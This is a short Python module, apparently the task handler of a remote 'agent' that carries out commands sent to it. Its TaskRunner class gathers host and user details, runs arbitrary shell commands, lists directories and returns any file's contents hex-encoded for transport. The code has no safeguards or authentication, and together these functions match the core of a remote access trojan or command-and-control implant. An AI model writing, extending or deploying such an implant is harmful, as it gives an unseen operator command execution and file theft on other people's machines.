"""
Task execution module for agents
"""

import subprocess
import os
import platform
import json

class TaskRunner:
    def __init__(self):
        self.system = platform.system().lower()
    
    def execute(self, task: dict) -> dict:
        """Execute a task and return results"""
        command_type = task.get('command')
        
        try:
            if command_type == 'system_info':
                return self._get_system_info()
            elif command_type == 'execute':
                return self._execute_command(task.get('cmd', ''))
            elif command_type == 'file_list':
                return self._list_files(task.get('path', '.'))
            elif command_type == 'download_file':
                return self._read_file(task.get('file_path', ''))
            else:
                return {"status": "error", "message": f"Unknown command: {command_type}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _get_system_info(self) -> dict:
        """Collect system information"""
        import socket
        import platform
        
        return {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "user": os.getenv('USERNAME') or os.getenv('USER'),
            "cwd": os.getcwd()
        }
    
    def _execute_command(self, command: str) -> dict:
        """Execute a system command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Command timed out"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _list_files(self, path: str) -> dict:
        """List files in directory"""
        try:
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                stats = os.stat(item_path)
                files.append({
                    "name": item,
                    "size": stats.st_size,
                    "is_dir": os.path.isdir(item_path)
                })
            return {"files": files}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def _read_file(self, file_path: str) -> dict:
        """Read file contents (for small files)"""
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            return {
                "content": content.hex(),  # Return as hex for safe transport
                "size": len(content)
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}